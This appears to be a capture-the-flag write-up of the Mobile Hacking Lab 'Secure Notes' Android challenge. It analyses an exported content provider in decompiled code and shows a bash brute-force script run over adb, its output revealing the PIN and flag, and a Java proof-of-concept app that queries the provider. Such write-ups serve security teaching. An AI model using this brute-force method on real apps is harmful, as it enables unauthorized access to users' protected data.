---
title: Secure Notes - Mobile Hacking Lab
date: 2025-3-20 00:00:00 +/-TTTT
categories: [Mobile Hacking Lab]
tags: [mobile hacking lab, writeup, mobile penetration testing, android]     # TAG names should always be lowercase
---



<br />

### Introduction

Welcome to the Secure Notes Challenge! This lab immerses you in the intricacies of Android content providers, challenging you to crack a PIN code protected by a content provider within an Android application. It's an excellent opportunity to explore Android's data management and security features.

<br />

### Objective

Retrieve a PIN code from a secured content provider in an Android application.

<br />





When we open the application, there is a field provided to enter a PIN. 

<br />

![](/assets/img/mhl/SecureNotes/1.png)

<br />

When I entered **1234** as the PIN, the application returned **"[ERROR: Incorrect PIN]"**.

<br /><br />

**Analyzing the application using JADX**

From: AndroidManifest.xml

```xml
<provider
    android:name="com.mobilehackinglab.securenotes.SecretDataProvider"
    android:enabled="true"
    android:exported="true"
    android:authorities="com.mobilehackinglab.securenotes.secretprovider"/>
<activity
    android:name="com.mobilehackinglab.securenotes.MainActivity"
    android:exported="true">
    <intent-filter>
        <action android:name="android.intent.action.MAIN"/>
        <category android:name="android.intent.category.LAUNCHER"/>
    </intent-filter>
</activity>
```

The **SecretDataProvider** content provider was **exported** in the application's manifest file, allowing other apps to access it.

The **`android:exported="true"`** attribute makes the content provider accessible to external applications, potentially allowing unauthorized access if not properly secured.

<br />

From: com.mobilehackinglab.securenotes.MainActivity

```java
private final void querySecretProvider(java.lang.String r9) {
    /*
        r8 = this;
        java.lang.String r0 = "content://com.mobilehackinglab.securenotes.secretprovider"
        android.net.Uri r0 = android.net.Uri.parse(r0)
        java.lang.StringBuilder r1 = new java.lang.StringBuilder
}
```

This is the URI used to access the application’s content provider.

<br /><br />





From: com.mobilehackinglab.securenotes.SecretDataProvider

```java
public final class SecretDataProvider extends ContentProvider {
    private byte[] encryptedSecret;
    private int iterationCount;
    private byte[] iv;
    private byte[] salt;

    public boolean onCreate() {
        AssetManager assets;
        InputStream open;
        Properties properties = new Properties();
        Context context = getContext();
        if (context != null && (assets = context.getAssets()) != null && (open = assets.open("config.properties")) != null) {}
    }

    public Cursor query(Uri uri, String[] projection, String selection, String[] selectionArgs, String sortOrder) {
        Object m130constructorimpl;
        Intrinsics.checkNotNullParameter(uri, "uri");
        MatrixCursor matrixCursor = null;
        if (selection == null || !StringsKt.startsWith$default(selection, "pin=", false, 2, (Object) null)) {
            return null;
        }
        String removePrefix = StringsKt.removePrefix(selection, (CharSequence) "pin=");
        try {
            StringCompanionObject stringCompanionObject = StringCompanionObject.INSTANCE;
            String format = String.format("%04d", Arrays.copyOf(new Object[]{Integer.valueOf(Integer.parseInt(removePrefix))}, 1));
            Intrinsics.checkNotNullExpressionValue(format, "format(format, *args)");
            try {
                Result.Companion companion = Result.INSTANCE;
                SecretDataProvider $this$query_u24lambda_u241 = this;
                m130constructorimpl = Result.m130constructorimpl($this$query_u24lambda_u241.decryptSecret(format));
            } catch (Throwable th) {
                Result.Companion companion2 = Result.INSTANCE;
                m130constructorimpl = Result.m130constructorimpl(ResultKt.createFailure(th));
            }
            if (Result.m136isFailureimpl(m130constructorimpl)) {
                m130constructorimpl = null;
            }
            String secret = (String) m130constructorimpl;
            if (secret != null) {
                MatrixCursor $this$query_u24lambda_u243_u24lambda_u242 = new MatrixCursor(new String[]{"Secret"});
                $this$query_u24lambda_u243_u24lambda_u242.addRow(new String[]{secret});
                matrixCursor = $this$query_u24lambda_u243_u24lambda_u242;
            }
            return matrixCursor;
        } catch (NumberFormatException e) {
            return null;
        }
    }
}
```

The code verifies whether the query begins with **“pin=”**. If not, or if the **selection** parameter is **null**, the method returns **null**, indicating that the query has failed.

If the query is valid, the **“pin=”** prefix is stripped, leaving only the PIN value.

For instance, if the query is **“pin=1234”**, the extracted PIN value will be **“1234”**.

The PIN is first converted into an integer.

Next, it is formatted to always have **4 digits** using the **`%04d`** format.

For example:

- If the PIN is **“1”**, it is converted to **“0001”**.
- If the PIN is **“12”**, it becomes **“0012”**.



<br /><br />

The code accesses the **config.properties** file stored in the application's **assets** folder. If the file is missing or an error occurs during access, the operation fails. However, if the file is found, its data is read.

Let's examine the **config.properties** file inside the **assets** folder:

From: assets/config.properties

```bash
encryptedSecret=bTjBHijMAVQX+CoyFbDPJXRUSHcTyzGaie3OgVqvK5w=
salt=m2UvPXkvte7fygEeMr0WUg==
iv=L15Je6YfY5owgIckR9R3DQ==
iterationCount=10000
```

<br /><br />



**Bruteforce the PIN**

```bash
#!/bin/bash

AUTHORITY="com.mobilehackinglab.securenotes.secretprovider" 
URI="content://${AUTHORITY}/Secret" # The content provider URI

echo "[+] Starting PIN Brute-Force..."

for PIN in $(seq -w 0000 9999); do
    RESULT=$(adb shell content query --uri "$URI" --where "pin=$PIN" 2>/dev/null)
    
    if [[ $RESULT == *"Secret"* ]]; then
        echo "[+] PIN Found: $PIN"
        echo "$RESULT"
        break
    else
        echo "[-] Trying PIN: $PIN"
    fi
done

echo "[+] Brute-force Complete"
```



<br />

<br />

Output:

```bash
[-] Trying PIN: 2559
[-] Trying PIN: 2560
[-] Trying PIN: 2561
[-] Trying PIN: 2562
[-] Trying PIN: 2563
[-] Trying PIN: 2564
[-] Trying PIN: 2565
[-] Trying PIN: 2566
[-] Trying PIN: 2567
[-] Trying PIN: 2568
[-] Trying PIN: 2569
[-] Trying PIN: 2570
[-] Trying PIN: 2571
[-] Trying PIN: 2572
[-] Trying PIN: 2573
[-] Trying PIN: 2574
[-] Trying PIN: 2575
[-] Trying PIN: 2576
[-] Trying PIN: 2577
[-] Trying PIN: 2578
[-] Trying PIN: 2579
[+] PIN Found: 2580
Row: 0 Secret=CTF{D1d_y0u_gu3ss_1t!1?}
```

<br />

The correct PIN is **2580**

<br />

![](/assets/img/mhl/SecureNotes/2.png)



<br /><br />

**Android app PoC**



```xml
<queries>
    <package android:name="com.mobilehackinglab.securenotes" />
</queries>
```

<br />

```java
Uri uri = Uri.parse("content://com.mobilehackinglab.securenotes.secretprovider");
for(int i =2570;i<2581;i++){
    String selection = "pin=" + String.format("%04d",i);
    Cursor cursor = getContentResolver().query(uri, null, selection, null, null);
    if (cursor != null && cursor.moveToFirst()) {
        int index = cursor.getColumnIndex("Secret");
        if (index != -1) {
            String flag = cursor.getString(index);
            Log.d("securenotes","[+] PIN: " + i + "\n[+] Flag: " + flag);
        }
    }
}
```





